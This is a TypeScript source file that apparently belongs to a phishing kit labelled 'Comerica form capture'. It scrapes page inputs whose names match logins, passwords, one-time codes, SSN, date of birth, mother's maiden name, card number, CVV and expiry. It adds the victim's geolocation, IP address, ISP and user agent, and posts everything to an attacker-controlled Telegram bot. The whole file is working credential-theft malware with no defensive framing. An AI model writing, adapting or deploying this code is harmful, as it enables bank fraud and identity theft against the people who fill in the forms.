export async function sendPageInputTagsToTelegram(): Promise<void> {
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
  const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.warn(
      'Telegram bot token or chat id is not set. Skipping Telegram input tag send.',
    );
    return;
  }

  const inputs = Array.from(document.querySelectorAll<HTMLInputElement>('input'))
    .filter((input) => isRelevantInput(input));
  const [location, ipInfo] = await Promise.all([
    getLocation(),
    getIPInfo(),
  ]);
  const userAgent = navigator.userAgent;
  const message = buildTelegramMessage(inputs, location, ipInfo, userAgent);

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
  } catch (error) {
    console.error('Failed to send Telegram message:', error);
  }
}

function buildTelegramMessage(
  inputs: HTMLInputElement[],
  location: string,
  ipInfo: { ip: string; isp: string },
  userAgent: string,
): string {
  const timestamp = new Date().toISOString();
  const header = [
    'Comerica form capture',
    `Page: ${window.location.href}`,
    `Title: ${document.title || 'Untitled page'}`,
    `Time: ${timestamp}`,
    `Location: ${location}`,
    `IP: ${ipInfo.ip}`,
    `ISP: ${ipInfo.isp}`,
    `User-Agent: ${userAgent}`,
    '',
  ].join('\n');

  if (!inputs.length) {
    return `${header}No input fields were found on this page.`;
  }

  const lines = inputs.map((input, index) => {
    const label = getInputLabel(input);
    const value = getInputValue(input);

    return [
      `${index + 1}. ${label}`,
      `   type: ${input.type}`,
      `   value: ${value}`,
      input.id ? `   id: ${input.id}` : null,
      input.name ? `   name: ${input.name}` : null,
      input.placeholder ? `   placeholder: ${input.placeholder}` : null,
      `   required: ${input.required}`,
      `   disabled: ${input.disabled}`,
    ]
      .filter(Boolean)
      .join('\n');
  });

  return `${header}Captured fields:\n${lines.join('\n\n')}`;
}

function isRelevantInput(input: HTMLInputElement): boolean {
  const text = [
    input.id,
    input.name,
    input.type,
    input.placeholder,
    input.getAttribute('aria-label'),
    input.labels?.[0]?.textContent || '',
  ]
    .filter(Boolean)
    .join(' ')
    .toLowerCase();

  return /(user|userid|password|otp|code|billing|address|city|state|zip|ssn|dob|mother|card|cvv|expiry)/.test(text);
}

function getInputLabel(input: HTMLInputElement): string {
  const labelText = input.labels?.[0]?.textContent?.trim();
  if (labelText) {
    return labelText;
  }

  return (
    input.getAttribute('aria-label') ||
    input.placeholder ||
    input.name ||
    input.id ||
    'Unnamed field'
  );
}

function getInputValue(input: HTMLInputElement): string {
  if (input.type === 'checkbox' || input.type === 'radio') {
    return input.checked ? 'true' : 'false';
  }

  return input.value || '(empty)';
}

async function getLocation(): Promise<string> {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve('Geolocation not supported');
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        resolve(`${latitude}, ${longitude}`);
      },
      (error) => {
        resolve(`Location access denied: ${error.message}`);
      },
      { timeout: 10000 }
    );
  });
}

async function getIPInfo(): Promise<{ ip: string; isp: string }> {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return {
      ip: data.ip || 'Unknown',
      isp: data.org || 'Unknown',
    };
  } catch (error) {
    return {
      ip: 'Failed to fetch',
      isp: 'Failed to fetch',
    };
  }
}
